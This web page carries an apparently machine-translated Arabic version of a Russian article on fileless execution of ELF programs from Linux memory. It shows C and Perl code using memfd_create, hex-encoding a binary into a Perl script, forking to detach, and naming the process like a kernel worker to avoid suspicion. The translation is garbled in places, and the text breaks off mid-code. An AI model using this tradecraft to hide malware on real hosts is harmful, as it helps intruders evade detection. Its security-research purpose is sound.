<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>๐ ๐๏ธ โฏ๏ธ ุงูุฌุงู ูู ุงูุฐุงูุฑุฉ. ุชุดุบูู ELF ูู Linux RAM ๐๏ธ ๐จ๐ฝโโ๏ธ ๐จ๐ผโ๐ผ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ููุชุณุจ ุชูุฒูุน ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุฎุงููุฉ ูู ุงููููุงุช ุดุนุจูุฉ. ููุฐุง ููุณ ููุงุฌุฆูุง ุ ูุฃู ุนูู ูุซู ูุฐู ุงูุจุฑุงูุฌ ูุง ูุชุฑู ุฃู ุฃุซุฑ ุชูุฑูุจูุง. ูู ูุฐู ุงูููุงูุฉ ูู ูุชุทุฑู ุฅูู ุชู...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>ุงูุฌุงู ูู ุงูุฐุงูุฑุฉ. ุชุดุบูู ELF ูู Linux RAM</h1><div class="post__body post__body_full" style=";text-align:right;direction:rtl"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/" style=";text-align:right;direction:rtl"><p style=";text-align:right;direction:rtl"><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p style=";text-align:right;direction:rtl"> ููุชุณุจ ุชูุฒูุน ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงูุฎุงููุฉ ูู ุงููููุงุช ุดุนุจูุฉ.  ููุฐุง ููุณ ููุงุฌุฆูุง ุ ูุฃู ุนูู ูุซู ูุฐู ุงูุจุฑุงูุฌ ูุง ูุชุฑู ุฃู ุฃุซุฑ ุชูุฑูุจูุง.  ูู ูุฐู ุงูููุงูุฉ ูู ูุชุทุฑู ุฅูู ุชูููุฉ ุชุดุบูู ุงูุจุฑุงูุฌ ูู ุฐุงูุฑุฉ Windows.  ูุญู ูุฑูุฒ ุนูู ุฌูู / ููููุณ.  ููููู Linux ุจุดูู ุตุญูุญ ุนูู ูุทุงุน ุงูุฎุงุฏู ุ ููุนูุด ุนูู ููุงููู ุงูุฃุฌูุฒุฉ ุงููุถููุฉ ููููุฑ ุงูุบุงูุจูุฉ ุงูุนุธูู ูู ููุงุฑุฏ ุงูููุจ.  ุจุนุฏ ุฐูู ุ ุณูููู ุจูุฑุงุฌุนุฉ ูุตูุฑุฉ ูุฅููุงููุงุช ุชูููุฐ ุงูุจุฑุงูุฌ ูู ุงูุฐุงูุฑุฉ ููุซุจุช ุฃู ุฐูู ูููู ุญุชู ูู ุงูุธุฑูู ุงูุตุนุจุฉ. </p><a name="habracut"></a><br><p style=";text-align:right;direction:rtl">  ุชุนุชุจุฑ ุชูููุงุช ุงูุชูููุฐ ุงูุฎุงููุฉ ูู ุงููููุงุช ุณุฑูุฉ ุ ูู ุงูุตุนุจ ููุบุงูุฉ ุงูุชุดุงู ูุชุชุจุน ุงุณุชุฎุฏุงููุง.  ูู ุชููู ุฃุฏูุงุช ุงูุชุญูู ูู ุชูุงูู ูุธุงู ุงููููุงุช ุจุชุญุฐูุฑ ุงููุณุคูู ุ ุญูุซ ูุง ุชุญุฏุซ ุนูููุงุช ูุชุงุจุฉ ุนูู ุงููุฑุต ุฃู ุชุญุฏุซ ุชุบููุฑุงุช ูู ุงูููู ุนูู ุงููุฑุต.  ูุง ูุฑุงูุจ ุจุฑูุงูุฌ ููุงูุญุฉ ุงูููุฑูุณุงุช (ุบุงูุจูุง ูุง ููููู ูุณุชุฎุฏูู * nix) ุฐุงูุฑุฉ ุงูุจุฑูุงูุฌ ุจุนุฏ ุจุฏุก ุงูุชุดุบูู.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ูู ุงูุนุฏูุฏ ูู ุชูุฒูุนุงุช ุบูู / ููููุณ ุ ูุจุงุดุฑุฉ ุจุนุฏ ุงูุชุซุจูุช ุ ุชุชููุฑ ูุฌููุนุฉ ูุงุณุนุฉ ูู ุฃุฏูุงุช ุงูุชุตุญูุญ ุงููุชููุนุฉ ูุงููุชุฑุฌููู ุงูููุฑููู ููุฌูุนู ูุบุงุช ุงูุจุฑูุฌุฉ ูุงูููุชุจุงุช ููู.  ูู ูุฐุง ูุฎูู ุธุฑูููุง ููุชุงุฒุฉ ูุงุณุชุฎุฏุงู ุชูููุงุช ุชูููุฐ ุงูุจุฑูุงูุฌ ุงูุฎุงูู ูู ุงููููุงุช.  ูููู ุจุงูุฅุถุงูุฉ ุฅูู ูุฒุงูุง ุงุณุชุฎุฏุงููุง ุ ููุงู ุฃูุถูุง ุนููุจ - ูุง ุชูุฌู ูุฐู ุงูุจุฑุงูุฌ ูู ุงูุชุนุชูู ุฃู ุฅุนุงุฏุฉ ุชุดุบูู ุงููุถูู ุงููุณุชูุฏู.  ูููู ุฃุซูุงุก ุชุดุบูู ุงููุถูู ุ ูุนูู ุงูุจุฑูุงูุฌ. </p><br><p style=";text-align:right;direction:rtl">  ูููู ููุฌุจ ุงุณุชุฎุฏุงู ูุฐู ุงูุชูููุงุช ููุณ ููุท ูุชูุฒูุน ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ.  ุฅุฐุง ูุงูุช ุณุฑุนุฉ ุชูููุฐ ุงูุจุฑูุงูุฌ ุญุงุณูุฉ ุจุงููุณุจุฉ ูู ุ ููู ุจุชุญููููุง ูู ุฐุงูุฑุฉ ุงููุตูู ุงูุนุดูุงุฆู.  ูู ุงููุงูุน ุ ุชุจุฏู ุงูุนุฏูุฏ ูู ุชูุฒูุนุงุช Linux ุฑุงุฆุนุฉ ุนูุฏูุง ุชุนูู ุจุดูู ูุงูู ูู ุฐุงูุฑุฉ ุงููุตูู ุงูุนุดูุงุฆู ุ ููุง ูุณูุญ ูู ุจุงูุนูู ูุน ูุญุฑูุงุช ุงูุฃูุฑุงุต ุงูุตูุจุฉ ุฏูู ุญูุธ ุฃู ูููุงุช ุนูููุง.  ูู ูุฌูุฉ ูุธุฑ ุชุฏููู ุฃูู ุงููุนูููุงุช ุ ุชุนุฏ ุทุฑู ุงูุชูููุฐ ุงูุณุฑู ููุจุฑุงูุฌ ูููุฏุฉ ููุบุงูุฉ ููุฑุญูุฉ ูู ูุฑุญูุฉ ูุง ุจุนุฏ ุงูุชุดุบูู ูุงูุงุณุชุฎุจุงุฑุงุช ุฏุงุฎู ูุญูุท ุงูุดุจูุฉ ุงููุณุชูุฏูุฉ.  ุฎุงุตุฉ ุฅุฐุง ูุงูุช ุงูุณุฑูุฉ ุงููุตูู ูู ุฃุญุฏ ุดุฑูุท ุงููุฑุงุฌุนุฉ. <br>  ููููุง ูุจูุงุจุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">barkly.com</a> ูู ุนุงู 2018 ุ ุชุญุฏุซ ุจุงููุนู 35 ูช ูู ูุฌูุงุช ุงูููุฑูุณุงุช ูู ุจุฑุงูุฌ ุถุงุฑุฉ ุชุนูู ูู ุงูุฐุงูุฑุฉ. </p><br><p style=";text-align:right;direction:rtl">  ูู ุญุงูุฉ Windows ุ ูุณุชุฎุฏู ูุฌุฑูู ุงูุฅูุชุฑูุช ุจูุดุงุท ูุธุงู Powershell ุงููุซุจุช ูุณุจููุง ูุชูุฒูู ุงูุฑูุฒ ูุชูููุฐู ุนูู ุงูููุฑ.  ุชูุณุชุฎุฏู ูุฐู ุงูุชูููุงุช ุนูู ูุทุงู ูุงุณุน ุ ูู ุจูู ุฃููุฑ ุฃุฎุฑู ุ ุจูุถู ุชูููุฐูุง ูู ุฃุทุฑ ูุซู Powershell Empire ู Powersploit ู Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux" style=";text-align:right;direction:rtl">  ูุงุฐุง ุนู ููููุณุ </h1><br><p style=";text-align:right;direction:rtl">  ูู ูุนุธู ุงูุญุงูุงุช ุ ุชุญุชูู ุชูุฒูุนุงุช Linux ุงููุซุจุชุฉ ุนูู ุงูุฃุฌูุฒุฉ ุงููุถููุฉ ุนูู ูุฌููุนุฉ ุจุฑุงูุฌ ูุซุจุชุฉ ูุณุจููุง.  ููุงุนุฏุฉ ุนุงูุฉ ุ ูุชููุฑ ูุชุฑุฌููู ุจูุบุงุช ุงูุจุฑูุฌุฉ: Python ู Perl ู C. ูุชุฑุฌู. PHP ููุฌูุฏ ูู ููุงูุน ุงูุงุณุชุถุงูุฉ ูู ุงูููุญู.  ูููุฑ ูุฐุง ุงูุดุฑุท ุงููุฏุฑุฉ ุนูู ุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ุจุงุณุชุฎุฏุงู ูุฐู ุงููุบุงุช. </p><br><p style=";text-align:right;direction:rtl">  ุนูู Linux ุ ูุฏููุง ุงูุนุฏูุฏ ูู ุงูุฎูุงุฑุงุช ุงููุนุฑููุฉ ูุชูููุฐ ุงูุชุนูููุงุช ุงูุจุฑูุฌูุฉ ูู ุงูุฐุงูุฑุฉ. <br>  ุฃุณูู ุทุฑููุฉ ูู ุงุณุชุฎุฏุงู ููุทูุฉ ุงูุฐุงูุฑุฉ ุงููุดุชุฑูุฉ ุงููุซุจุชุฉ ูุณุจููุง ุนูู ูุธุงู ุงููููุงุช. </p><br><p style=";text-align:right;direction:rtl">  ูู ุฎูุงู ูุถุน ุงูููู ุงููุงุจู ููุชูููุฐ ูู ุฏููู / dev / shm ุฃู / run / shm ุ ูู ุงููููู ุชูููุฐู ูู ุงูุฐุงูุฑุฉ ูุจุงุดุฑุฉ ุ ูุธุฑูุง ูุฃู ูุฐู ุงูุฏูุงุฆู ููุณุช ุณูู ุฐุงูุฑุฉ ูุตูู ุนุดูุงุฆู ูุซุจุชุฉ ุนูู ูุธุงู ุงููููุงุช.  ูููู ูููู ุนุฑุถูุง ูุน ls ูุซู ุฃู ุฏููู ุขุฎุฑ.  ูููุงุนุฏุฉ ุนุงูุฉ ุ ูุชู ุชุญููู ูุฐู ุงูุฏูุงุฆู ุจุนูุงูุฉ noexec ุ ููุง ูุชููุฑ ุชูููุฐ ุงูุจุฑุงูุฌ ูู ูุฐู ุงูุฏูุงุฆู ุฅูุง ูููุณุชุฎุฏู ุงูุฎุงุฑู.  ูุฐุง ุ ููู ุชููู ุฃูุซุฑ ุบููุถุงู ููููุงู ุ ุชุญุชุงุฌ ุฅูู ุดูุก ุขุฎุฑ. </p><br><p style=";text-align:right;direction:rtl"> ุงูุฌุฏูุฑ ุจุงูุฐูุฑ ูู ุงุณุชุฏุนุงุก ูุธุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">memfd_create (2)</a> .  ูุนูู ุงุณุชุฏุนุงุก ุงููุธุงู ูุฐุง ุดูุฆูุง ูุซู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">malloc (3)</a> ุ ููููู ูุง ูุนูุฏ ูุคุดุฑูุง ุฅูู ููุทูุฉ ุฐุงูุฑุฉ ุ ูููู ูุงุตู ููู ุฅูู ููู ูุฌููู ุ ูุงูุฐู ูุง ูุธูุฑ ูู ูุธุงู ุงููููุงุช ุฅูุง ูุฑุงุจุท ูู <code>/proc/PID/fd/</code> ุ ูุงูุฐู ูููู ูู ุฎูุงูู ุชูููุฐู ุจุงุณุชุฎุฏุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">execve (2).</a> <br>  ุฅููู ูุง <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุชูููู</a> ุตูุญุฉ ุฏููู ุงุณุชุฏุนุงุก ูุธุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">memfd_create (ุจุงูุฑูุณูุฉ)</a> : </p><br><p style=";text-align:right;direction:rtl">  <em>"ูุชู ุงุณุชุฎุฏุงู ุงูุงุณู ุงููุญุฏุฏ ูู</em> <code>name</code> <em>ูุงุณู ููููู ูุณูุชู ุฅุธูุงุฑู ููุฏู ููุฑุงุจุท ุงูุฑูุฒู ุงูููุงุจู ูู ุงูุฏููู. <code>/proc/self/fd/</code> . ูุจุฏุฃ ุงุณู ุงูุนุฑุถ ุฏุงุฆููุง ุจู <code>memfd:</code> ููู ูู ุฃุฌู ุงูุชุตุญูุญ ููุท. ูุง ุชุคุซุฑ ุงูุฃุณูุงุก ุนูู ุณููู ุงูููู "ูุงุตู ุ ูุจุงูุชุงูู ูููู ุฃู ูููู ูููููุงุช ุงููุชุนุฏุฏุฉ ููุณ ุงูุงุณู ุฏูู ุฃู ุนูุงูุจ."</em> </p><br><p style=";text-align:right;direction:rtl">  ูุซุงู ุนูู ุงุณุชุฎุฏุงู <code>memfd_create()</code> ููุบุฉ C: </p><br><pre style=";text-align:right;direction:rtl"> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p style=";text-align:right;direction:rtl">  ูุณุชุฎุฏู ุงูููุฏ ุฃุนูุงู <code>memfd</code> ุ ูููุดุฆ ุนูููุฉ <code>memfd</code> ุ ูููุฌู ูุฎุฑุฌุงุชู ุฅูู ููู ูุคูุช ุ ูููุชุธุฑ ุงูุชูุงู ุงูุนูููุฉ ุงููุฑุนูุฉ ุ ูููุฑุฃ ูุฎุฑุฌุงุชู ูู ุงูููู ุงููุคูุช.  ุนุงุฏุฉ ุ ูุชู ุงุณุชุฎุฏุงู ุงูุฃูุจูุจ "|" ูุฅุนุงุฏุฉ ุชูุฌูู ุฅุฎุฑุงุฌ ุฃุญุฏ ุงูุจุฑุงูุฌ ุฅูู ุฅุฏุฎุงู ุจุฑูุงูุฌ ุขุฎุฑ ูู * nix. </p><br><p style=";text-align:right;direction:rtl">  ุชุชููุฑ ุฃูุถูุง ุฅููุงููุฉ ุงุณุชุฎุฏุงู <code>syscall()</code> ุจูุบุงุช ูุชุฑุฌูุฉ ูุซู perl ู python ููุง ุฅูู ุฐูู. ุจุนุฏ ุฐูู ุ ูุนุชุจุฑ ุฃุญุฏ ุงูุณููุงุฑูููุงุช ุงููุญุชููุฉ <code>memfd_create()</code> ุงููุฏุฑุฉ ุนูู ุชุญููู ุงููููุงุช ุงููุงุจูุฉ ููุชูููุฐ ูู ุงูุฐุงูุฑุฉ ุจุงุณุชุฎุฏุงู <code>memfd_create()</code> . </p><br><h3 id="perl" style=";text-align:right;direction:rtl">  ุจูุฑู </h3><br><p style=";text-align:right;direction:rtl">  ุงูุชุฑุถ ุฃู ูุฏููุง ููุทุฉ ุฏุฎูู ูู ุดูู ุญูู ุงูุฃูุงูุฑ. <br>  ูุญู ุจุญุงุฌุฉ ุฅูู ุทุฑููุฉ ูุฅุฌุฑุงุก ููุงููุงุช ุงููุธุงู ุนูู ุงููุธุงู ุงููุฏู. <br>  ูู perl ุ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุณุชุณุงุนุฏูุง</a> ูุธููุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">syscall () ูู</a> ุฐูู. <br>  ุณูุญุชุงุฌ ุฃูุถูุง ุฅูู ุทุฑููุฉ ููุชุงุจุฉ ELF ูุจุงุดุฑุฉ ุฅูู ุงูุฐุงูุฑุฉ ููุญุชููุงุช ููู ูุฌููู. <br>  ููููุงู ุจุฐูู ุ ุณูุถุน ELF ูุจุงุดุฑุฉ ูู ูุต ุงูุจุฑูุงูุฌ ุงููุตู ุ ูุงูุฐู ุจุฏูุฑู ุณูุชู ูููู ุฅูู ุงููุธุงู ุงููุณุชูุฏู ูู ุฎูุงู ุฅุฏุฎุงู ุงูุฃูุฑ ุงููุชุงุญ.  ุจุฏูุงู ูู ุฐูู ุ ููููู ุฃูุถูุง ุชูุฒูู ุงูููู ุงููุงุจู ููุชูููุฐ ุนุจุฑ ุงูุดุจูุฉ. <br>  ูููู ูุจู ุฐูู ูุฌุฏุฑ ุฅุจุฏุงุก ุชุญูุธ.  ูุญุชุงุฌ ุฅูู ูุนุฑูุฉ ุฅุตุฏุงุฑ linux kernel ุนูู ุงููุถูู ุงููุณุชูุฏู ุ ูุธุฑูุง ูุฃู ุงุณุชุฏุนุงุก ูุธุงู <code>memfd_create()</code> ุงููุทููุจ ูุชููุฑ ููุท ูู ุงูุฅุตุฏุงุฑ <strong>3.17</strong> ูุงูุฅุตุฏุงุฑุงุช ุงูุฃุญุฏุซ. </p><br><p style=";text-align:right;direction:rtl">  ุฏุนููุง ูููู <code>memfd_create()</code> ุนูู <code>memfd_create()</code> ู <code>execve()</code> </p><br><p style=";text-align:right;direction:rtl">  ุจุงููุณุจุฉ <code>MFD_CLOEXEC</code> ุ <code>MFD_CLOEXEC</code> ุซุงุจุช <code>MFD_CLOEXEC</code> ุ ุงูุฐู "ูุนููู ุนูุงูุฉ <code>close-on-exec (FD_CLOEXEC)</code> ููุตู ููู ููุชูุญ ุฌุฏูุฏ."  ูุฐุง ูุนูู ุฃู ูุงุตู ุงูููู ุงูุฎุงุต ุจูุง ุณูุบูู ุชููุงุฆููุง ุจุนุฏ ุชูููุฐ ELF ุงูุฎุงุต ุจูุง ุจุงุณุชุฎุฏุงู <code>execve()</code> </p><br><p style=";text-align:right;direction:rtl">  ูุธุฑูุง ูุฃููุง <code>syscall()</code> ูุธููุฉ <code>syscall()</code> ููุบุฉ Perl ุ <code>syscall</code> ุฅูู ููู ุฑูููุฉ ูุงุณุชุฏุนุงุก <code>syscall</code> ููุง. <br>  ููููู ุงูุนุซูุฑ ุนูููุง ูู <code>/usr/include</code> ุฃู ุนูู ุงูุฅูุชุฑูุช.  ูููู ุงูุนุซูุฑ ุนูู ุฑูู ุงุณุชุฏุนุงุก ุงููุธุงู ูู <code>#define</code> ุจุฏุกูุง ูู <code>__NR_</code> <br>  ูู ุญุงูุชูุง ุ ูุชู ุชุฑููู <code>memfd_create()</code> 319 ููุธุงู ุชุดุบูู 64 ุจุช.  ูุงูุซุงุจุช ูู <code>FD_CLOSEXEC 0x0001U</code> (ุฃู 1 ูู <code>linux/memfd.h</code> ) </p><br><p style=";text-align:right;direction:rtl">  ุงูุขู ูุฏููุง ูู ุงูููู ุงูุนุฏุฏูุฉ ุงููุงุฒูุฉ ุ ููููููุง ุฃู ููุชุจ ูู Perl <code>memfd_create(name, MFD_CLOEXEC)</code> ูู <code>memfd_create(name, MFD_CLOEXEC)</code> ูู C. <br>  ุณูุญุชุงุฌ ุฃูุถูุง ุฅูู ุงุจุชูุงุฑ ุงุณู ููู ุณูุชู ุนุฑุถู ูู <code>/memfd:</code> <br>  ุณูููู ูู <code>[:kworker]</code> ุงุฎุชูุงุฑ ุงุณู ูุดุงุจู ูู <code>[:kworker]</code> ุฃู ุขุฎุฑ ุ ูุง ูุณุจุจ ุงูุดู. <br>  ุนูู ุณุจูู ุงููุซุงู ุ ุณููุฑุฑ ุณูุณูุฉ ูุงุฑุบุฉ ุฅูู ูุนููุฉ ุงูุงุณู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ูุฏููุง ูุงุตู ููู ูุฌููู ูู $ fd ููุญู ุจุญุงุฌุฉ ููุชุงุจุฉ ELF ุฅูู ูุฐุง ุงูููู. <br>  ุนุงุฏุฉ ูุง ูุชู ุงุณุชุฎุฏุงู ูุธููุฉ <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">open ()</a> ูู perl ููุชุญ ุงููููุงุช ุ ูููู ุจุงุณุชุฎุฏุงู <code>&gt;&amp;=FD</code> ุจูุงุก ุ ุชูุฑูุฑ ุงููุงุตู ุฅูู ูุฐู ุงููุธููุฉ ุจุฏูุงู ูู ุงุณู ุงูููู ุ ูุญูู ูุงุตู ุงููููุงุช ุงูููุชูุญ ุจุงููุนู ุฅูู ููุจุถ ููู. <br>  ุณูููู ูููุฏูุง ุฃูุถูุง ูู <code>autoflush[]</code> : </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุงูุขู ูุฏููุง ููุจุถ ูุดูุฑ ุฅูู ููู ูุฌููู. </p><br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุฐูู ุ ูุญุชุงุฌ ุฅูู ุชุญููู ููููุง ุงููุงุจู ููุชูููุฐ ุฅูู ุจูุงูุงุช ูููู ูุถุนูุง ูู ูุต ูุต Perl ุงููุตู. <br>  ููููุงู ุจุฐูู ุ ูููู ุจูุง ููู: </p><br><pre style=";text-align:right;direction:rtl"> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p style=";text-align:right;direction:rtl">  ูุญุตู ุนูู ุงูุนุฏูุฏ ูู ุงูุฎุทูุท ุงููุชุดุงุจูุฉ: </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p style=";text-align:right;direction:rtl">  ุจุนุฏ ุชูููุฐูุง ุ ุณูุถุน ููููุง ุงููุงุจู ููุชูููุฐ ูู ุงูุฐุงูุฑุฉ.  ูู ูุง ุชุจูู ููุง ูู ุฅุทูุงูู. </p><br><h4 id="fork" style=";text-align:right;direction:rtl">  ุดููุฉ () </h4><br><p style=";text-align:right;direction:rtl">  ุงุฎุชูุงุฑูุง ูููููุง ุงุณุชุฎุฏุงู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุดููุฉ ()</a> .  ูุฐุง ููุณ ุถุฑูุฑููุง ุนูู ุงูุฅุทูุงู.  ูููู ุฅุฐุง ููุง ูุง ูุฑูุฏ ููุท ุชุดุบูู ELF ููุชู ุงูุนูููุฉ ุ ูุณูุญุชุงุฌ ุฅูู ุงุณุชุฎุฏุงู <code>fork()</code> . <br>  ุจุดูู ุนุงู ุ ูุจุฏู ุฅูุดุงุก ุนูููุฉ ุชุงุจุนุฉ ูู perl ุดูุฆูุง ูุซู ูุฐุง: </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p style=";text-align:right;direction:rtl">  ุชููู ูุงุฆุฏุฉ <code>fork()</code> ุฃูุถูุง ูู ุญูููุฉ ุฃูู ูู ุฎูุงู ุชุณููุชูุง ุฌูุจูุง ุฅูู ุฌูุจ ูุน <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">setid (2)</a> ุ ููููู ูุตู ุงูุนูููุฉ ุงููุฑุนูุฉ ุนู ุงูุนูููุฉ ุงูุฃู ูุงูุณูุงุญ ูููุงูุฏ ุจุฅููุงุก: </p><br><pre style=";text-align:right;direction:rtl"> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { # 